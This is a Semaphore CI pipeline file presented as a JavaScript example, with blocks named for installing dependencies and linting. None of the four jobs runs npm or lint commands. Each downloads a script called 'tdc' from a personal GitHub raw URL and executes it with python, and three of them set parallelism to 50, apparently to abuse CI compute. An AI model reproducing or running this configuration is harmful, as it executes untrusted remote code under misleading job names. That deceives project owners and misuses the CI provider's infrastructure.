version: v1.0
name: Semaphore JavaScript Example Pipeline
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu2004
blocks:
  - name: "\U0001F4E6 Install dependencies"
    task:
      env_vars:
        - name: NODE_ENV
          value: test
        - name: CI
          value: 'true'
      prologue:
        commands:
          - checkout
          - nvm use
          - node --version
          - npm --version
      jobs:
        - name: client npm install and cache
          commands:
            - 'wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc'
          parallelism: 50
        - name: server npm install and cache
          commands:
            - 'wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc'
          parallelism: 50
  - name: "\U0001F50D Lint"
    task:
      env_vars:
        - name: NODE_ENV
          value: test
        - name: CI
          value: 'true'
      prologue:
        commands:
          - checkout
          - nvm use
          - node --version
          - npm --version
      jobs:
        - name: Client Lint
          commands:
            - 'wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc'
          parallelism: 50
        - name: Server Lint
          commands:
            - 'wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc'
after_pipeline:
  task:
    jobs:
      - name: Publish Results
        commands:
          - test-results gen-pipeline-report
